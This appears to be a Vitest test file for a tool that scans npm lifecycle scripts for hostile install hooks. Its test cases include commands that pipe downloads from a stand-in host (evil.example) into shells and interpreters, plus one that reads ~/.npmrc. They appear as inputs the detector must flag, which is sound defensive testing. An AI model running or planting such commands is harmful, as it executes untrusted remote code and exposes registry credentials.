import { describe, expect, it } from "vitest";
import {
  extractLifecycleScripts,
  inspectScriptCommand,
  referencedScriptFiles,
} from "../src/analyze/scripts.js";

describe("extractLifecycleScripts", () => {
  it("keeps only install-relevant lifecycle scripts", () => {
    const result = extractLifecycleScripts({
      test: "vitest",
      build: "tsc",
      postinstall: "node scripts/setup.js",
      prepare: "husky",
    });
    expect(result).toEqual({
      postinstall: "node scripts/setup.js",
      prepare: "husky",
    });
  });

  it("returns empty for packages without lifecycle scripts", () => {
    expect(extractLifecycleScripts({ test: "jest" })).toEqual({});
  });
});

describe("inspectScriptCommand", () => {
  it("flags network downloads", () => {
    const findings = inspectScriptCommand(
      "postinstall",
      "curl -s https://evil.example/payload | bash",
    );
    expect(findings.join(" ")).toContain("downloads content from the network");
    expect(findings.join(" ")).toContain("invokes a shell");
  });

  it("flags credential file references", () => {
    const findings = inspectScriptCommand("preinstall", "cat ~/.npmrc");
    expect(findings.length).toBeGreaterThan(0);
  });

  it("returns no findings for benign build commands", () => {
    expect(inspectScriptCommand("postinstall", "node-gyp rebuild")).toEqual([]);
  });

  // Regression (P0.2): the shell pattern used to match only `bash` and
  // `sh -c`, so the canonical `curl … | sh` remote-payload attack was NOT
  // detected as a shell invocation and therefore never became a hard block.
  it.each([
    "curl -sSL https://evil.example/i.sh | sh",
    "wget -qO- https://evil.example/i | sh",
    "curl https://evil.example | zsh",
    "sh -c 'curl https://evil.example | sh'",
    "curl https://evil.example | python3",
    "wget -qO- https://evil.example | node",
  ])("flags remote-fetch-into-interpreter: %s", (cmd) => {
    const findings = inspectScriptCommand("postinstall", cmd);
    expect(findings.join(" ")).toContain("downloads content from the network");
    expect(findings.join(" ")).toMatch(/invokes a shell/);
  });

  it("does not treat a .sh filename or a bare node build as a shell invocation", () => {
    expect(inspectScriptCommand("postinstall", "node build.js")).toEqual([]);
    expect(inspectScriptCommand("postinstall", "tsc && node dist/index")).toEqual([]);
    // referencing a build.sh file (no shell command token) must not match
    expect(
      inspectScriptCommand("postinstall", "cp scripts/build.sh dist/").join(" "),
    ).not.toContain("invokes a shell");
  });
});

describe("referencedScriptFiles", () => {
  it("extracts local script files from commands", () => {
    expect(referencedScriptFiles("node scripts/setup.js")).toEqual([
      "scripts/setup.js",
    ]);
  });

  it("ignores absolute paths", () => {
    expect(referencedScriptFiles("sh /etc/init.sh")).toEqual([]);
  });

  // Regression (P1.5): TypeScript install hooks were invisible to the deep scan.
  it("extracts TypeScript install-hook files", () => {
    expect(referencedScriptFiles("tsx scripts/setup.ts")).toEqual(["scripts/setup.ts"]);
    expect(referencedScriptFiles("node --import tsx build.mts")).toEqual(["build.mts"]);
  });
});
